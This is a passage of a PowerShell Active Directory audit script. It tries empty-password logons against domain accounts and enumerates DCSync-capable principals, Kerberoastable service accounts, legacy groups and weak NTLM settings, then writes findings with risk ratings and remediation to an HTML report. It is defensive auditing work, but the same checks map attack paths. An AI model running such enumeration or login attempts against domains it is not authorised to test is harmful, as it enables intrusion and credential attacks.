							"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $EmptyPasswordUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
						"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $EmptyPasswordUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
						"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $EmptyPasswordUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
						"Last Logon" = $EmptyPasswordUser.lastlogontimestamp
						"SID" = $EmptyPasswordUser.objectSID
						"Domain" = $Domain
					}
				}
				
				Start-Sleep -Milliseconds $delay
				
			}
			
		}
		
		else {
			
			$TempTotalEmptyPass = foreach ($AllDomain in $AllDomains) {
				
				$PotentialUsersWithEmptyPassword = @()
				$PotentialComputersWithEmptyPassword = @()
				$PotentialUsersWithEmptyPassword = Get-DomainUser -Domain $AllDomain -UACFilter NOT_ACCOUNTDISABLE | Sort-Object samaccountname
				$PotentialComputersWithEmptyPassword = Get-DomainComputer -Domain $AllDomain -UACFilter NOT_ACCOUNTDISABLE | Sort-Object samaccountname
				$TotalPotentialEmptyPass = New-Object System.Collections.ArrayList
				$null = $TotalPotentialEmptyPass.AddRange($PotentialUsersWithEmptyPassword)
				$null = $TotalPotentialEmptyPass.AddRange($PotentialComputersWithEmptyPassword)
				
				Add-Type -AssemblyName "System.DirectoryServices.AccountManagement"
				$EmptyServer = ((Get-NetDomain -Domain $AllDomain).PdcRoleOwner).name
				$principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $EmptyServer, $AllDomain)
			
				foreach($EmptyPasswordUser in $TotalPotentialEmptyPass){
				
					$EmptyPasswordUserName = $EmptyPasswordUser.samaccountname
					
					$EmptyCheck = $principalContext.ValidateCredentials("$EmptyPasswordUserName", "", 1)
					
					if ($EmptyCheck){
					
						[PSCustomObject]@{
							"User Name" = $EmptyPasswordUser.samaccountname
							"Enabled" = if ($EmptyPasswordUser.useraccountcontrol -band 2) { "False" } else { "True" }
							"Active" = if ($EmptyPasswordUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
								"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $EmptyPasswordUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
							"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $EmptyPasswordUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
							"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $EmptyPasswordUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
							"Last Logon" = $EmptyPasswordUser.lastlogontimestamp
							"SID" = $EmptyPasswordUser.objectSID
							"Domain" = $AllDomain
						}
					}
					
				}
				
			}
		}
	
	 	if ($TempTotalEmptyPass) {
			$TempTotalEmptyPass | Sort-Object Domain,"User Name" | Format-Table -AutoSize -Wrap
			$HTMLTotalEmptyPass = $TempTotalEmptyPass | Sort-Object Domain,"User Name" | ConvertTo-Html -Fragment -PreContent "<h2>Users with empty passwords</h2>"
	
	  		$TotalEmptyPassTable = [PSCustomObject]@{
				"Risk Rating" = "High - Needs Immediate Attention"
				"Description" = "Empty passwords can be set for users and computers when password policies allow it or the Password-not-required attribute is enabled. This makes user accounts extremely easy for an attacker to compromise."
				"Remediation" = "Enforce strong password policies and ensure that all users have a secure and non-empty password. Disable the Password-not-required attribute for all users in the domain."
			}
			
			$HTMLTotalEmptyPassTable = $TotalEmptyPassTable | ConvertTo-Html -As List -Fragment
		}

 	}
	
	############################################
    ########### Pre-Windows 2000 ###############
	############################################
	
	
	Write-Host ""
	Write-Host "Members of Pre-Windows 2000 Compatible Access group:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		#$PreWin2kCompatibleAccess = Get-DomainGroup -Domain $Domain -Server $Server -Identity "Pre-Windows 2000 Compatible Access"
		$PreWin2kCompatibleAccessMembers = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Pre-Windows 2000 Compatible Access" -Recurse | Where-Object { $_.MemberName -ne "Authenticated Users" }
		$TempPreWin2kCompatibleAccess = foreach ($Member in $PreWin2kCompatibleAccessMembers) {
			$memberName = $Member.MemberName.TrimEnd('$')
			$computer = Get-DomainComputer -Identity $memberName -Domain $Domain -Server $Server
			$ipAddress = Resolve-DnsName -Name $memberName -Type A -Server $Server | Select-Object -ExpandProperty IPAddress

			[PSCustomObject]@{
				"Member" = $Member.MemberName
				"Enabled" = if ($Member.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($computer.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
				"IP Address" = $ipAddress
				"Member SID" = $Member.MemberSID
				"Operating System" = $computer.operatingsystem
				"Object Class" = $Member.MemberObjectClass
				"Domain" = $Domain
			}
		}
	}
	else {
		$TempPreWin2kCompatibleAccess = foreach ($AllDomain in $AllDomains) {
			$Server = Get-DomainController -Domain $AllDomain | Where-Object {$_.Roles -like "RidRole"} | Select-Object -ExpandProperty Name
			#$PreWin2kCompatibleAccess = Get-DomainGroup -Domain $AllDomain -Identity "Pre-Windows 2000 Compatible Access"
			$PreWin2kCompatibleAccessMembers = Get-DomainGroupMember -Domain $AllDomain -Identity "Pre-Windows 2000 Compatible Access" -Recurse | Where-Object { $_.MemberName -ne "Authenticated Users" }
			foreach ($Member in $PreWin2kCompatibleAccessMembers) {
				$memberName = $Member.MemberName.TrimEnd('$')
				$computer = Get-DomainComputer -Identity $memberName -Domain $AllDomain
				$ipAddress = Resolve-DnsName -Name $memberName -Type A -Server $Server | Select-Object -ExpandProperty IPAddress

				[PSCustomObject]@{
					"Member" = $Member.MemberName
					"Enabled" = if ($Member.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($computer.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = $ipAddress
					"Member SID" = $Member.MemberSID
					"Operating System" = $computer.operatingsystem
					"Object Class" = $Member.MemberObjectClass
					"Domain" = $AllDomain
				}
			}
		}
	}

 	if ($TempPreWin2kCompatibleAccess) {
		$TempPreWin2kCompatibleAccess | Sort-Object Domain,Member | Format-Table -AutoSize -Wrap
		$HTMLPreWin2kCompatibleAccess = $TempPreWin2kCompatibleAccess | Sort-Object Domain,Member | ConvertTo-Html -Fragment -PreContent "<h2>Members of Pre-Windows 2000 Compatible Access group</h2>"

  		$PreWindows2000Table = [PSCustomObject]@{
			"Description" = "Pre-Windows 2000 computer objects used to get assigned a password based on the computer name instead of a random one. This can be leveraged to gain a foothold or to compromise your domain."
			"Remediation" = "Avoid creating legacy compatible computer accounts. Make sure trust and computer password rotation are working properly. Get rid of legacy computer accounts that have not been active for a long time."
		}
		
		$HTMLPreWindows2000Table = $PreWindows2000Table | ConvertTo-Html -As List -Fragment
	}

 	########################################################
    ########### Hosts running Unsupported OS ###############
	########################################################
	
    if($NoUnsupportedOS){}
    else{
        Write-Host ""
		Write-Host "Hosts running Unsupported OS:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$UnsupportedHosts = Get-DomainComputer -Domain $Domain -Server $Server | Where-Object {
				($_.OperatingSystem -like "Windows Me*") -or
				($_.OperatingSystem -like "Windows NT*") -or
				($_.OperatingSystem -like "Windows 95*") -or
				($_.OperatingSystem -like "Windows 98*") -or
				($_.OperatingSystem -like "Windows XP*") -or
				($_.OperatingSystem -like "Windows 7*") -or
				($_.OperatingSystem -like "Windows Vista*") -or
				($_.OperatingSystem -like "Windows 2000*") -or
				($_.OperatingSystem -like "Windows 8*") -or
				($_.OperatingSystem -like "Windows Server 2008*") -or
				($_.OperatingSystem -like "Windows Server 2003*") -or
				($_.OperatingSystem -like "Windows Server 2000*")
			}

			$TempUnsupportedHosts = foreach ($UnsupportedHost in $UnsupportedHosts) {
				[PSCustomObject]@{
					"Name" = $UnsupportedHost.samaccountname
					"Enabled" = if ($UnsupportedHost.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($UnsupportedHost.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = (Resolve-DnsName -Name $UnsupportedHost.DnsHostName -Type A).IPAddress
					"Account SID" = $UnsupportedHost.objectsid
					"Operating System" = $UnsupportedHost.operatingsystem
					Domain = $Domain
				}
			}
		}
		else {
			$TempUnsupportedHosts = foreach ($AllDomain in $AllDomains) {
				$UnsupportedHosts = Get-DomainComputer -Domain $AllDomain | Where-Object {
					($_.OperatingSystem -like "Windows Me*") -or
					($_.OperatingSystem -like "Windows NT*") -or
					($_.OperatingSystem -like "Windows 95*") -or
					($_.OperatingSystem -like "Windows 98*") -or
					($_.OperatingSystem -like "Windows XP*") -or
					($_.OperatingSystem -like "Windows 7*") -or
					($_.OperatingSystem -like "Windows Vista*") -or
					($_.OperatingSystem -like "Windows 2000*") -or
					($_.OperatingSystem -like "Windows 8*") -or
					($_.OperatingSystem -like "Windows Server 2008*") -or
					($_.OperatingSystem -like "Windows Server 2003*") -or
					($_.OperatingSystem -like "Windows Server 2000*")
				}

				foreach ($UnsupportedHost in $UnsupportedHosts) {
					[PSCustomObject]@{
						"Name" = $UnsupportedHost.samaccountname
						"Enabled" = if ($UnsupportedHost.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if ($UnsupportedHost.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
						"IP Address" = (Resolve-DnsName -Name $UnsupportedHost.DnsHostName -Type A).IPAddress
						"Account SID" = $UnsupportedHost.objectsid
						"Operating System" = $UnsupportedHost.operatingsystem
						Domain = $AllDomain
					}
				}
			}
		}

  		if ($TempUnsupportedHosts) {
			$TempUnsupportedHosts | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap
			$HTMLUnsupportedHosts = $TempUnsupportedHosts | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2>Hosts running Unsupported OS</h2>"

   			$UnsupportedOSTable = [PSCustomObject]@{
				"Risk Rating" = "Critical - Needs Immediate Attention"
				"Description" = "These systems no longer receive security updates and patches from the vendor. This increases the likelihood of successful attacks, and exposes the entire domain to potential security breaches."
				"Remediation" = "It is essential to prioritize isolating, migrating or upgrading these machines to supported and regularly updated operating systems to mitigate these risks."
			}
			
			$HTMLUnsupportedOSTable = $UnsupportedOSTable | ConvertTo-Html -As List -Fragment
   			$HTMLUnsupportedOSTable = $HTMLUnsupportedOSTable.Replace("Description", '<a href="https://www.ncsc.gov.uk/collection/device-security-guidance/managing-deployed-devices/keeping-devices-and-software-up-to-date">Description</a>')
			$HTMLUnsupportedOSTable = $HTMLUnsupportedOSTable.Replace("Remediation", '<a href="https://www.ncsc.gov.uk/collection/device-security-guidance/managing-deployed-devices/obsolete-products">Remediation</a>')
		}

    }
	
	##################################################
    ########### LM Compatibility Level ###############
	##################################################
	
	Write-Host ""
	Write-Host "LM Compatibility Level:" -ForegroundColor Cyan

	$policySettings = @{
		"0" = "Send LM & NTLM responses"
		"1" = "Send LM & NTLM - use NTLMv2 session security if negotiated"
		"2" = "Send NTLM response only"
		"3" = "Send NTLMv2 response only"
		"4" = "Send NTLMv2 response only. Refuse LM"
		"5" = "Send NTLMv2 response only. Refuse LM and NTLM"
	}

	if ($Domain -and $Server) {
 		$Results = @()
		Get-DomainGPO -Domain $Domain -Server $Server -LDAPFilter "(name=*)" -Properties gpcfilesyspath, displayname |
			ForEach-Object {
				$gpoPath = $_.gpcfilesyspath.TrimStart("[").TrimEnd("]")
				$gpoDisplayName = $_.displayname
				$gpoSetting = (Get-Content -Path "$gpoPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" -Raw | Select-String -Pattern "LmCompatibilityLevel" | Select-Object -Last 1).Line
				$gpoSetting = ($gpoSetting | Out-String) -split "`n"
				$gpoSetting = $gpoSetting | Select-String -Pattern "LmCompatibilityLevel"
				$gpoSetting = ($gpoSetting | Out-String) -split "`n"
				$gpoSetting = $gpoSetting.Trim()
				$gpoSetting = $gpoSetting | Where-Object { $_ -ne "" }

				if ($gpoSetting) {
					$settingValue = ($gpoSetting -split "=")[-1].Trim().Split(",")[-1].Trim()
					$policySetting = $policySettings[$settingValue]

					$Results += [PSCustomObject]@{
     						Domain = $Domain
						"GPO Name" = $gpoDisplayName
						Setting = $settingValue
						"LM Compatibility Level" = $policySetting
					}
				}

			}

			if ($Results.Count -eq 0) {
			    $TempLMCompatibilityLevel = [PSCustomObject]@{
       				Domain = $Domain
			        "GPO Name" = "No GPO Set"
			        Setting = "Default"
			        "LM Compatibility Level" = "Dependent on the OS"
			    }
			}
			else {
			    $TempLMCompatibilityLevel = $Results  # process this array to get a single output per domain as needed
			}
	} 
	
	else {
		$TempLMCompatibilityLevel = foreach ($AllDomain in $AllDomains) {
  			$Results = @()
			Get-DomainGPO -Domain $AllDomain -LDAPFilter "(name=*)" -Properties gpcfilesyspath, displayname |
			ForEach-Object {
				$gpoPath = $_.gpcfilesyspath.TrimStart("[").TrimEnd("]")
				$gpoDisplayName = $_.displayname
				$gpoSetting = (Get-Content -Path "$gpoPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" -Raw | Select-String -Pattern "LmCompatibilityLevel" | Select-Object -Last 1).Line
				$gpoSetting = ($gpoSetting | Out-String) -split "`n"
				$gpoSetting = $gpoSetting | Select-String -Pattern "LmCompatibilityLevel"
				$gpoSetting = ($gpoSetting | Out-String) -split "`n"
				$gpoSetting = $gpoSetting.Trim()
				$gpoSetting = $gpoSetting | Where-Object { $_ -ne "" }

				if ($gpoSetting) {
					$settingValue = ($gpoSetting -split "=")[-1].Trim().Split(",")[-1].Trim()
					$policySetting = $policySettings[$settingValue]

					$Results += [PSCustomObject]@{
     						Domain = $AllDomain
						"GPO Name" = $gpoDisplayName
						Setting = $settingValue
						"LM Compatibility Level" = $policySetting
					}
				}

			}

			if ($Results.Count -eq 0) {
			        [PSCustomObject]@{
			            Domain = $AllDomain
			            "GPO Name" = "No GPO Set"
			            Setting = "Default"
			            "LM Compatibility Level" = "Dependent on the OS"
			        }
			}
			else {
			        $Results
			}
   
		}
	}

 	if ($TempLMCompatibilityLevel) {
		$TempLMCompatibilityLevel | Sort-Object Domain,"GPO Name" | Format-Table -AutoSize -Wrap
		$HTMLLMCompatibilityLevel = $TempLMCompatibilityLevel | Sort-Object Domain,"GPO Name" | ConvertTo-Html -Fragment -PreContent "<h2>LM Compatibility Level</h2>"
		$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>Send NTLM response only</td>','<td class="YesStatus">Send NTLM response only</td>'
		$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>2</td>','<td class="YesStatus">2</td>'
		$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>Send LM & NTLM - use NTLMv2 session security if negotiated</td>','<td class="YesStatus">Send LM and NTLM - use NTLMv2 session security if negotiated</td>'
		$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>1</td>','<td class="YesStatus">1</td>'
		$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>Send LM and NTLM responses</td>','<td class="YesStatus">Send LM and NTLM responses</td>'
		$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>0</td>','<td class="YesStatus">0</td>'
  		$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>3</td>','<td class="NoStatus">3</td>'
      		$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>4</td>','<td class="NoStatus">4</td>'
	  	$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>5</td>','<td class="NoStatus">5</td>'
    	  	$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>Send NTLMv2 response only</td>','<td class="NoStatus">Send NTLMv2 response only</td>'
		$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>Send NTLMv2 response only. Refuse LM</td>','<td class="NoStatus">Send NTLMv2 response only. Refuse LM</td>'
     	  	$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>Send NTLMv2 response only. Refuse LM and NTLM</td>','<td class="NoStatus">Send NTLMv2 response only. Refuse LM and NTLM</td>'
	 	$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>Default</td>','<td class="YesStatus">Default</td>'
   		$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>No GPO Set</td>','<td class="YesStatus">No GPO Set</td>'

  		$LMCompatibilityLevelTable = [PSCustomObject]@{
			"Description" = "Determines which challenge response authentication protocol is used for network logons. If set lower than 3, NTLMv1 auth will be supported, which could be abused to compromise the domain."
   			"More Info" = "NTLMv1 is enabled on domain controllers to accept the connection of older operating systems. If no GPO defines the LAN Manager Authentication Level, the DCs fall back to the non secure default."
			#"Recommendation" = "Evaluate the necessity of enabling support for NTLMv1 authentication in your network, and consider raising the Compatibility Level to a minimum value of 3."
		}
		
		$HTMLLMCompatibilityLevelTable = $LMCompatibilityLevelTable | ConvertTo-Html -As List -Fragment
  		#$HTMLLMCompatibilityLevelTable = $HTMLLMCompatibilityLevelTable.Replace("*", "Description")
    		$HTMLLMCompatibilityLevelTable = $HTMLLMCompatibilityLevelTable.Replace("Description", '<a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level">Description</a>')
      		$HTMLLMCompatibilityLevelTable = $HTMLLMCompatibilityLevelTable.Replace("More Info", '<a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain">More Info</a>')
	}
	
	#################################################
    ########### Machine Account Quota ###############
	#################################################
	
	Write-Host ""
	Write-Host "Machine Account Quota:" -ForegroundColor Cyan

	if ($Domain -and $Server) {
		$dcName = "DC=" + $Domain.Split(".")
		$dcName = $dcName -replace " ", ",DC="
		$Quota = (Get-DomainObject -Domain $Domain -Server $Server -Identity "$dcName" -Properties ms-DS-MachineAccountQuota) | Select-Object -ExpandProperty ms-DS-MachineAccountQuota
  		if ($Quota -eq $null) { $InfoQuota = "10" } else { $InfoQuota = $Quota }
		
		$TempMachineQuota = [PSCustomObject]@{
			'Domain' = $Domain
			'Quota' = if ($Quota -eq $null) { "10" } else { $Quota }
   			Info = "Any user is allowed to create $InfoQuota computer accounts in this domain."
		}
	}
	else {
		$TempMachineQuota = foreach ($AllDomain in $AllDomains) {
			$dcName = "DC=" + $AllDomain.Split(".")
			$dcName = $dcName -replace " ", ",DC="
			$Quota = (Get-DomainObject -Domain $AllDomain -Identity "$dcName" -Properties ms-DS-MachineAccountQuota) | Select-Object -ExpandProperty ms-DS-MachineAccountQuota
   			if ($Quota -eq $null) { $InfoQuota = "10" } else { $InfoQuota = $Quota }
			
			[PSCustomObject]@{
				'Domain' = $AllDomain
				'Quota' = if ($Quota -eq $null) { "10" } else { $Quota }
    				Info = "Any user is allowed to create $InfoQuota computer accounts in this domain."
			}
		}
	}

 	if ($TempMachineQuota) {
	    $TempMachineQuota | Sort-Object Domain | Format-Table -AutoSize
	    $HTMLMachineQuota = $TempMachineQuota | Sort-Object Domain | ConvertTo-Html -Fragment -PreContent "<h2>Machine Account Quota</h2>"
	    $TempMachineQuota | Sort-Object Quota | Select-Object Quota | ForEach-Object {
	        if (${_}.Quota -eq 0) {
	            $HTMLMachineQuota = $HTMLMachineQuota -replace "<td>0</td>", "<td class=`"NoStatus`">0</td>"
	        } else {
	            $TempQuota = $_.Quota
	            $HTMLMachineQuota = $HTMLMachineQuota -replace "<td>$TempQuota</td>", "<td class=`"YesStatus`">$TempQuota</td>"
	        }
	    }

     		$MachineAccountQuotaTable = [PSCustomObject]@{
			"Description" = "A machine account creation quota higher than 0 increases the risk of unauthorized or excessive machine account creation, which can be leveraged to bypass security measures."
			#"Recommendation" = "It is recommended to set the machine account creation quota to 0 to mitigate these risks."
		}
		
		$HTMLMachineAccountQuotaTable = $MachineAccountQuotaTable | ConvertTo-Html -As List -Fragment
  		$HTMLMachineAccountQuotaTable = $HTMLMachineAccountQuotaTable.Replace("*", "Description")
	}

    	##################################
     ##################################
     ##################################
	
	$InterestingDataBanner = "<h3>Interesting Data</h3>"
	Write-Host ""
	Write-Host "Interesting Data" -ForegroundColor Red
	Write-Host ""
	$Keywords = @("Admin", "Azure", "Backup", "CCTV", "Cyber", "Desk", "Director", "File", "Finance", "FS", "Hyper", "JEA", "LAPS", "LLMNR", "Management", "MECM", "Mgmt", "Password", "PAM", "PAW", "PPL", "PSM", "PXE", "RDP", "Remote", "Remoting", "SCCM", "Security", "SQL", "VEEAM", "VMWare")
	
	##################################
    ########### DCSync ###############
	##################################

	Write-Host ""
	Write-Host "Principals with DCSync permissions:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$dcName = "DC=" + $Domain.Split(".")
		$dcName = $dcName -replace " ", ",DC="
		$replicationUsers = Get-ObjectAcl "$dcName" -Domain $Domain -Server $Server -ResolveGUIDs |
			Where-Object { ($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')} |
			Select-Object -Unique SecurityIdentifier

		$TempReplicationUsers = foreach ($replicationUser in $replicationUsers) {
  			
			$FinalMembername = $null
			$FinalMembernames = $null
			$FinalMembernames = @()
			
			$userSID = $null
			$user = $null
			$enabled = $null
   			$members = $null
			$userSID = ConvertFrom-SID -Domain $Domain $replicationUser.SecurityIdentifier
			$userSID = $userSID.Split('\')[-1]
			#$user = Get-DomainUser -Domain $Domain -Server $Server -Identity $userSID -Properties useraccountcontrol
			#$enabled = if ($user.useraccountcontrol -band 2) { "False" } elseif ($user.useraccountcontrol -eq $null) { "" } else { "True" }
			$members = Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse -Identity $userSID
			
			if($members){
				foreach($member in $members){
					
					$convertedMemberName = $null
					if($member.MemberName){}
					else{
						foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
							
							try {
								$convertedMemberName = ConvertFrom-SID $member.MemberSID -Domain $PlaceHolderDomain
								if ($null -ne $convertedMemberName) { break }
							}
							catch {
								continue
							}
							
						}

						if($convertedMemberName){}
			      			else {
			     				$ForeignGroupMemberAccount = $null
			     				$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $member.MemberSID
			    				$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
			     			}
	    
					}
					
					$FinalMembername = if ($member.MemberName) { $member.MemberName } elseif ($convertedMemberName) { $convertedMemberName } else {$member.MemberSID}
					$FinalMembernames += $FinalMembername
				}
			}
			
			else{$FinalMembernames = $null}

			[PSCustomObject]@{
   				"Domain" = $Domain
				"User or Group Name" = $userSID
				#"Enabled" = $enabled
				"Members" = ($FinalMembernames | Sort-Object -Unique) -join ' - '
			}
			
		}
	}
	else {
		$TempReplicationUsers = foreach ($AllDomain in $AllDomains) {
			$dcName = "DC=" + $AllDomain.Split(".")
			$dcName = $dcName -replace " ", ",DC="
			$replicationUsers = Get-ObjectAcl "$dcName" -Domain $AllDomain -ResolveGUIDs |
				Where-Object { ($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')} |
				Select-Object -Unique SecurityIdentifier

			foreach ($replicationUser in $replicationUsers) {
				
				$FinalMembername = $null
				$FinalMembernames = $null
				$FinalMembernames = @()
				
   				$userSID = $null
   				$user = $null
				$enabled = $null
   				$members = $null
				$userSID = ConvertFrom-SID $replicationUser.SecurityIdentifier -Domain $AllDomain
				$userSID = $userSID.Split('\')[-1]
				#$user = Get-DomainUser -Domain $AllDomain -Identity $userSID -Properties useraccountcontrol
				#$enabled = if ($user.useraccountcontrol -band 2) { "False" } elseif ($user.useraccountcontrol -eq $null) { "" } else { "True" }
				$members = Get-DomainGroupMember -Domain $AllDomain -Recurse -Identity $userSID
				
				if($members){
					foreach($member in $members){
						
						$convertedMemberName = $null
						if($member.MemberName){}
						else{
							foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
								
								try {
									$convertedMemberName = ConvertFrom-SID $member.MemberSID -Domain $PlaceHolderDomain
									if ($null -ne $convertedMemberName) { break }
								}
								catch {
									continue
								}
								
							}

       							if($convertedMemberName){}
				      			else {
				     				$ForeignGroupMemberAccount = $null
				     				$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $member.MemberSID
				    				$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
				     			}
						}
						
						$FinalMembername = if ($member.MemberName) { $member.MemberName } elseif ($convertedMemberName) { $convertedMemberName } else {$member.MemberSID}
						$FinalMembernames += $FinalMembername
					}
				}
				
				else{$FinalMembernames = $null}

				[PSCustomObject]@{
					"Domain" = $AllDomain
					"User or Group Name" = $userSID
					#"Enabled" = $enabled
					"Members" = ($FinalMembernames | Sort-Object -Unique) -join ' - '
				}
			}
			
		}
	}

 	if ($TempReplicationUsers) {
		$TempReplicationUsers | Sort-Object Domain,"User or Group Name" | Format-Table -AutoSize -Wrap
		$HTMLReplicationUsers = $TempReplicationUsers | Sort-Object Domain,"User or Group Name" | ConvertTo-Html -Fragment -PreContent "<h2>Principals with DCSync permissions</h2>"

  		$DCsyncPrincipalsTable = [PSCustomObject]@{
			"Recommendations" = "Review the permissions and privileges assigned to these accounts and ensure they align with the principle of least privilege."
		}
		
		$HTMLDCsyncPrincipalsTable = $DCsyncPrincipalsTable | ConvertTo-Html -As List -Fragment
  		$HTMLDCsyncPrincipalsTable = $HTMLDCsyncPrincipalsTable.Replace("*", "Recommendations")
	}

 	###########################################################
    ######### Exchange Trusted Subsystem group ###############
	###########################################################
	
	Write-Host ""
	Write-Host "Members of Exchange Trusted Subsystem group:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$ExchangeTrustedSubsystemMembers = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Exchange Trusted Subsystem" -Recurse
		$TempExchangeTrustedSubsystem = foreach ($Member in $ExchangeTrustedSubsystemMembers) {
			$memberName = $Member.MemberName.TrimEnd('$')
			$computer = Get-DomainComputer -Identity $memberName -Domain $Domain -Server $Server
			$ipAddress = Resolve-DnsName -Name $memberName -Type A -Server $Server | Select-Object -ExpandProperty IPAddress

			[PSCustomObject]@{
				"Member" = $Member.MemberName
				"Enabled" = if ($Member.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($computer.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
				"IP Address" = $ipAddress
				"Member SID" = $Member.MemberSID
				"Operating System" = $computer.operatingsystem
				"Object Class" = $Member.MemberObjectClass
				"Domain" = $Domain
			}
		}
	}
	else {
		$TempExchangeTrustedSubsystem = foreach ($AllDomain in $AllDomains) {
			$Server = Get-DomainController -Domain $AllDomain | Where-Object { $_.Roles -like "RidRole" } | Select-Object -ExpandProperty Name
			$ExchangeTrustedSubsystemMembers = Get-DomainGroupMember -Domain $AllDomain -Identity "Exchange Trusted Subsystem" -Recurse
			foreach ($Member in $ExchangeTrustedSubsystemMembers) {
				$memberName = $Member.MemberName.TrimEnd('$')
				$computer = Get-DomainComputer -Identity $memberName -Domain $AllDomain
				$ipAddress = Resolve-DnsName -Name $memberName -Type A -Server $Server | Select-Object -ExpandProperty IPAddress

				[PSCustomObject]@{
					"Member" = $Member.MemberName
					"Enabled" = if ($Member.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($computer.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = $ipAddress
					"Member SID" = $Member.MemberSID
					"Operating System" = $computer.operatingsystem
					"Object Class" = $Member.MemberObjectClass
					"Domain" = $AllDomain
				}
			}
		}
	}

	if ($TempExchangeTrustedSubsystem) {
		$TempExchangeTrustedSubsystem | Sort-Object Domain,Member | Format-Table -AutoSize -Wrap
		$HTMLExchangeTrustedSubsystem = $TempExchangeTrustedSubsystem | Sort-Object Domain,Member | ConvertTo-Html -Fragment -PreContent "<h2>Members of Exchange Trusted Subsystem group</h2>"
	}
	
	############################################
    ########### Service Accounts ###############
	############################################
	
	
	Write-Host ""
	Write-Host "Service Accounts (Kerberoastable):" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$ServiceAccounts = Get-DomainUser -SPN -Domain $Domain -Server $Server
		$TempServiceAccounts = foreach ($Account in $ServiceAccounts) {
			[PSCustomObject]@{
				"Account" = $Account.samaccountname
				"Enabled" = if ($Account.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($Account.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
    				"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $Account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $Account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $Account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				#"Adm" = if ($Account.memberof -match 'Administrators') { "YES" } else { "NO" }
				#"DA" = if ($Account.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				#"EA" = if ($Account.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $Account.lastlogontimestamp
				"SID" = $Account.objectSID
				"Domain" = $Domain
				#"Groups Membership" = (Get-DomainGroup -Domain $Domain -Server $Server -UserName $Account.samaccountname).Name -join ' - '
			}
		}
	}
	
	else {
		$TempServiceAccounts = foreach ($AllDomain in $AllDomains) {
			$ServiceAccounts = Get-DomainUser -SPN -Domain $AllDomain
